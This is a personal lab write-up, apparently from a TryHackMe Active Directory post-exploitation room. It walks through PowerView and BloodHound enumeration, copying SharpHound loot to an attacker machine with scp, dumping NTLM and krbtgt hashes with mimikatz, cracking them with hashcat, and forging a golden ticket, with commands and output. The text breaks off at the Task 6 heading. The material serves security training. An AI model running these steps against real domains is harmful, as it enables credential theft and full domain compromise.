```bash
export IP=10.10.61.225
```
# After we get a golden/silver ticket
We will learn about:
- Post exploitation enumeration
- Dumping hashes using mimikatz
- Basic information gathering using windows server logs
- Learn about basics of maintaing access with the metasploit persistence module 
- Creating a backdoor to get an instant meterpreter shell if the system was reset or shutdown.

> Topics
1. Introduction
2. Enumeratoin with powerview
3. Enumeration with bloodhound
4. Dumping hashes with mimikatz
5. Golden ticket attack with mimikatz
6. Enumeration with server manager
7. Maintaining access



# Task 2. Enumeration with powerview
Powerview is a powerful powershell script for enumerating a domain after you have already gained a shell in the system. 
We'll be focusing on how to start up and get users and groups from PowerView.

> Enumerate the domain users:
```
Get-NetUser | select cn
```
*syntax = powershell -ep bypass* 
(to bypass the execution policy of powershell to allow you to run scripts easily.)
type  to get a list of users

We got:
* Administrator
* Guest
* krbtgt
* Machine-1
* Admin2
* Machine-2
* SQL Service
* POST{P0W3RV13W_FTW}
* sshd 

> Enumerate the domain groups of user 'admin':
```
Get-NetGroup -GroupName *admin*
```
We got:
* Administrators 
* Hyper-V Administrators
* Storage Replica Administrators
* Schema Admins
* Enterprise Admins
* Domain Admins
* Key Admins
* Enterprise Key Admins
* DnsAdmins

# Task 3. Enumerate with bloodhound

> To install bloodhound run the following in the terminal.
```Bash 
sudo apt install bloodhound
and then,
ne04j console
```

> Getting loot with sharphound.
Type the following in powershell, after running `sharphound.exe`:
```
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```

----
PS C:\Users\Administrator> Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip 

Initializing SharpHound at 11:11 AM on 3/4/2022


Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container 

[+] Creating Schema map for domain CONTROLLER.LOCAL using path CN=Schema,CN=Configuration,DC=CONTROLLER,DC=LOCAL     
PS C:\Users\Administrator> [+] Cache File Found! Loaded 104 Objects in cache 

[+] Pre-populating Domain Controller SIDS 
Status: 0 objects finished (+0) -- Using 82 MB RAM 
Status: 66 objects finished (+66 8)/s -- Using 86 MB RAM 
Enumeration finished in 00:00:00.3600579
Compressing data to C:\Users\Administrator\20220304111128_loot.zip 
You can upload this file directly to the UI

SharpHound Enumeration Completed at 11:11 AM on 3/4/2022! Happy Graphing!


---
Now we have the .zip file on the victim machine, we want to have it on our attacker machine to use.
---
> To do that we need `scp`
```
┌──(sypher㉿kali)-[~]
└─$ scp administrator@10.10.156.60:/Users/Administrator/20220304110716_loot.zip ~/Downloads 
administrator@10.10.156.60's password: 
Permission denied, please try again.
administrator@10.10.156.60's password: 
20220304110716_loot.zip 
```
---
Now we can use **bloodhound**
-

```bash
run `bloodhound` in the terminal
```
- And then sign in using the same credentials you set with neo4j.
- After that drag and drop the .zip file to bloodhound.

# Task 4. Dumping hashes with mimikatz 
* We'll be focusing on dumping the NTLM hashes with mimikatz and then cracking those hashes using hashcat. 

* To do just that, we need to run the following inside mimikatz;
```
lsadump::lsa /patch
```
* By typing the above command we get the NTLM hashes of all the users.
* And then we can use hashcat to crack those hashes.
```
> hashcat -m 1000 -a 0 Machine1-hash.txt ~/thm-rooms/pass.txt
```
# Task 5. Golden Ticket Attacks with mimikatz

1. Dump the krbtgt hash:
* We can use mimikatz to dump the SID and NTLM hash of the krbtgt domain admin
```
> lsadump::lsa /inject /name:krbtgt
```
And we get the following;
* SID = S-1-5-21-849420856-2351964222-986696166
* NTLM = 5508500012cc005cf7082a9a89ebdfdf

2. Create A Golden Ticket:
* Type the following inside mimikatz;
```
> kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
```
* Now the ticket will be saved to the directory where you started mimikatz

## Use the Golden ticket to access other machine
1. `misc::cmd` This command will open a new command prompt with elevated privileges to all machines.
```
mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF7AD9F43B8
```
2. Access other Machines! - You will now have another command prompt with access to all other machines on the network. 
# Task 6. Enumeration with Server Manager
